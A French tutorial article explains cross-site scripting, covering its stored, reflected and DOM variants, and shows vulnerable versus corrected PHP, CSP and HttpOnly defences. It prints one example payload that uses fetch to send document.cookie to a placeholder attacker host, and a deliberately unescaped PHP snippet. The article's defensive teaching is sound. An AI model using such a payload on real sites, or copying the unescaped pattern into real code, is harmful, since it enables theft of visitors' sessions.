---
title: "XSS (Cross-Site Scripting) expliqué simplement"
description: "Le XSS permet à un attaquant d'injecter du code JavaScript exécuté dans le navigateur d'un autre utilisateur. Stocké, réfléchi, DOM : explication, diagramme et code PHP avant/après."
date: 2026-07-30
category: "Sécurité & Performance"
difficulty: "Intermédiaire"
tags: ["securite", "owasp", "xss", "php", "javascript"]
summary: "Le Cross-Site Scripting (XSS) permet à un attaquant d'injecter du JavaScript malveillant dans une page, exécuté ensuite dans le navigateur d'autres utilisateurs. Contrairement à l'injection SQL qui cible le serveur, le XSS cible directement les visiteurs du site."
bearMemory:
  - "Le XSS cible le **navigateur des victimes**, pas la base de données : la donnée injectée n'attaque jamais le serveur, elle attaque ceux qui la lisent."
  - "Trois variantes à distinguer : **stocké** (persisté en base, touche tout le monde), **réfléchi** (renvoyé immédiatement dans la réponse, via un lien piégé), **DOM** (le JavaScript côté client insère lui-même la donnée dangereuse, sans passer par le serveur)."
  - "La défense de base est l'échappement systématique à l'affichage (`htmlspecialchars` en PHP), complétée par une politique CSP (*Content Security Policy*) en défense en profondeur."
interviewQuestions:
  - q: "Quelle est la différence entre XSS stocké et XSS réfléchi ?"
    a: "Le XSS stocké enregistre le script malveillant en base de données (dans un commentaire, un profil, un avis) : il s'exécute pour chaque visiteur qui consulte cette donnée, sans action de leur part. Le XSS réfléchi, lui, ne persiste pas — le script fait partie de l'URL ou d'une requête, et n'atteint la victime que si elle clique sur un lien piégé spécifiquement construit par l'attaquant."
  - q: "Pourquoi htmlspecialchars() protège-t-il contre le XSS ?"
    a: "Parce qu'il convertit les caractères ayant un sens spécial en HTML (comme < et >) en leur équivalent textuel inoffensif (&lt; et &gt;). Le navigateur affiche alors ces caractères comme du texte brut au lieu de les interpréter comme une balise ou un script — la donnée reste visible, mais n'est plus exécutable."
  - q: "Le XSS est-il seulement un problème côté serveur PHP ?"
    a: "Non. Le XSS DOM se produit entièrement côté client : du JavaScript prend une donnée non fiable (une valeur d'URL, un fragment) et l'insère dans le DOM via innerHTML ou une méthode équivalente, sans jamais repasser par le serveur. La protection doit donc exister aussi bien côté serveur (échappement à l'affichage) que côté client (éviter innerHTML avec une donnée non fiable, préférer textContent)."
---

## Le problème

Un site affiche les commentaires laissés par ses visiteurs. Si le contenu d'un commentaire est inséré tel quel dans la page HTML, sans traitement, un visiteur malveillant peut écrire un commentaire qui contient non pas du texte, mais une balise `<script>`. Le navigateur de chaque personne qui consulte ensuite la page va exécuter ce script — exactement comme s'il faisait partie légitime du site.

Contrairement à l'injection SQL qui vise le serveur et sa base de données, le XSS (*Cross-Site Scripting*) détourne la confiance qu'un navigateur accorde au site qu'il affiche. Le script injecté tourne avec les mêmes droits que le vrai code du site : il peut lire les cookies de session, capturer ce que la victime tape, rediriger vers un site frauduleux, ou agir en son nom.

## L'idée générale

Il existe trois grandes variantes de XSS, qui se distinguent par le trajet emprunté par la donnée malveillante avant d'être exécutée :

- **XSS stocké (*stored*)** : le script est enregistré en base de données (commentaire, message, nom d'utilisateur...) puis renvoyé et exécuté pour chaque visiteur qui consulte cette donnée. C'est la variante la plus dangereuse : aucune interaction spécifique de la victime n'est nécessaire, elle est touchée simplement en visitant une page normale.
- **XSS réfléchi (*reflected*)** : le script fait partie de la requête elle-même (souvent un paramètre d'URL) et est renvoyé immédiatement dans la réponse HTML, sans être stocké. L'attaque nécessite que la victime clique sur un lien spécialement construit, généralement envoyé par email ou message.
- **XSS DOM** : la faille se situe entièrement côté client. Du JavaScript légitime du site lit une donnée non fiable (l'URL, un fragment `#...`, une valeur de formulaire) et l'insère dans la page via une méthode comme `innerHTML`, sans jamais transiter par le serveur.

Dans les trois cas, la cause racine est identique à celle de l'injection SQL : une donnée non fiable traitée comme du code exécutable plutôt que comme du texte. La différence est le langage cible — SQL pour l'injection SQL, HTML/JavaScript pour le XSS — et la victime — le serveur d'un côté, les autres utilisateurs de l'autre.

## Analogie du quotidien

Le XSS, c'est comme un panneau d'affichage municipal où n'importe qui peut coller une annonce. Si la mairie affiche telles quelles toutes les annonces déposées, sans les vérifier, quelqu'un de malintentionné peut coller une fausse annonce officielle — par exemple une redirection vers une fausse permanence administrative où il récupère les papiers d'identité des gens qui s'y présentent.

Les passants font confiance au panneau parce qu'il appartient à la mairie, exactement comme un navigateur fait confiance au code exécuté sur un site qu'il visite. L'échappement, c'est l'équivalent d'imprimer chaque annonce déposée dans un cadre standardisé et non modifiable, qui empêche quiconque de faire passer son message pour une information officielle de la mairie.

## Diagramme

{{< mermaid >}}
sequenceDiagram
    participant A as Attaquant
    participant Site as Site vulnérable
    participant DB as Base de données
    participant V as Victime

    Note over A,V: XSS stocké
    A->>Site: Poste un commentaire contenant <script>voleCookie()</script>
    Site->>DB: Enregistre le commentaire tel quel (sans échapper)
    V->>Site: Consulte la page de commentaires
    Site->>DB: Récupère les commentaires
    DB-->>Site: Contenu, y compris le script
    Site-->>V: Page HTML avec le script intégré
    Note over V: Le navigateur exécute le script comme s'il faisait partie du site
    V->>A: Cookie de session envoyé à l'attaquant
{{< /mermaid >}}

## Exemple de code

### Code vulnérable

```php
<?php
// Affichage d'un commentaire sans échappement
$commentaire = $_POST['commentaire']; // stocké tel quel, puis affiché plus tard
?>

<div class="commentaire">
    <?= $commentaire ?>
</div>
```

Si `$commentaire` vaut `<script>fetch('https://attaquant.test/vol?c=' + document.cookie)</script>`, ce script s'exécute dans le navigateur de chaque visiteur de la page — y compris avec les cookies de session légitimes du site.

### Code corrigé

```php
<?php
$commentaire = $_POST['commentaire'];
?>

<div class="commentaire">
    <?= htmlspecialchars($commentaire, ENT_QUOTES, 'UTF-8') ?>
</div>
```

`htmlspecialchars()` convertit `<`, `>`, `&`, `"` et `'` en leurs entités HTML équivalentes. Le navigateur affiche alors le commentaire comme du texte lisible — y compris s'il contient littéralement le mot "script" — sans jamais l'interpréter comme du code.

En complément, une politique **CSP** (*Content Security Policy*) déclarée via un en-tête HTTP limite les sources de scripts autorisées à s'exécuter sur la page, en défense en profondeur si un échappement venait à être oublié quelque part :

```php
<?php
header("Content-Security-Policy: default-src 'self'; script-src 'self'");
```

## Quand s'en préoccuper ?

- Sur **tout affichage** d'une donnée qui a, à un moment donné, transité par une entrée utilisateur — même si elle est passée par une base de données entre-temps.
- En particulier sur les contenus riches (commentaires, avis, profils, messages) où l'on est tenté d'autoriser du HTML pour la mise en forme : c'est le terrain le plus fréquent du XSS stocké.
- Côté client, dès qu'un script insère dynamiquement du contenu dans le DOM avec `innerHTML`, `outerHTML` ou `document.write` à partir d'une donnée qui n'est pas entièrement maîtrisée par le développeur (URL, paramètres, réponse d'API tierce).
- Sur les paramètres d'URL affichés directement dans la page (messages d'erreur personnalisés, champs de recherche pré-remplis) : terrain classique du XSS réfléchi.

## Points importants

- L'échappement doit se faire **à l'affichage**, pas à la saisie : stocker la donnée brute et échapper au moment de l'affichage évite les problèmes liés au contexte (le même texte n'est pas échappé de la même façon en HTML, en attribut, en JavaScript ou en URL).
- Si du HTML doit réellement être autorisé (un éditeur de texte riche, par exemple), il faut le filtrer avec une bibliothèque de *sanitization* dédiée (comme HTML Purifier en PHP) — jamais avec un échappement partiel fait main.
- Les cookies de session doivent porter l'attribut `HttpOnly`, qui empêche JavaScript d'y accéder même en cas de XSS réussi : ça ne corrige pas la faille, mais ça réduit fortement son impact (voir l'article sur l'authentification et les sessions sécurisées).
- Le XSS DOM échappe souvent aux protections côté serveur, car le problème se situe entièrement dans le JavaScript exécuté par le navigateur : `htmlspecialchars()` côté PHP ne protège en rien contre un `innerHTML` dangereux côté client.
